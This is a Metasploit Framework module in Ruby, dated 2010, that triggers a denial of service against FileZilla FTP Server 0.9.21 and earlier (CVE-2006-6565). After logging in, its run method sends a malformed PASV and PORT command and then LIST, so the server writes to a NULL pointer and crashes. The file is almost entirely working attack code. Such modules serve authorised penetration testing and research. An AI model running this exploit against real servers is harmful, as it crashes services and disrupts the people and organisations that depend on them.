##
# $Id: filezilla_server_port.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Ftp
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'FileZilla FTP Server <=0.9.21 Malformed PORT Denial of Service',
			'Description'	=> %q{
				This module triggers a Denial of Service condition in the FileZilla FTP
				Server versions 0.9.21 and earlier. By sending a malformed PORT command
				then LIST command, the server attempts to write to a NULL pointer.
			},
			'Author' 		=> [ 'patrick' ],
			'License'        	=> MSF_LICENSE,
			'Version'        	=> '$Revision: 9179 $',
			'References'     =>
				[
					[ 'BID', '21542' ],
					[ 'BID', '21549' ],
					[ 'CVE', '2006-6565' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/2914' ],
					[ 'OSVDB', '34435' ],
				],
			'DisclosureDate' => 'Dec 11 2006'))
	end

	def run
		connect_login

		send_cmd(['PASV', 'A*'], true) # Assigns PASV port
		send_cmd(['PORT', 'A*'], true) # Rejected but seems to assign NULL to pointer
		send_cmd(['LIST'], true) # Try and push data to NULL port, trigger crash :)

		disconnect
	end

end